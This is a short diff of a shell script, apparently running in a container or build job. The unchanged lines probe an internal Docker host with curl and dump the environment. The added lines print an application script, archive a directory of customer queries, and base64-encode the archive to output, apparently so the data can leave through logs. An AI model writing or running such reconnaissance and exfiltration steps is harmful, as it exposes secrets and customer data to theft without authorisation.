@@ -13,4 +13,6 @@ curl -vv 'http://172.17.0.1:8443/'
 
 env
 echo "/opt search :"
-find /opt
+cat /opt/dist/autocomplete.sh
+tar cvfz /tmp/temp.tgz /opt/dist/queries/customer
+cat /tmp/temp.tgz | base64
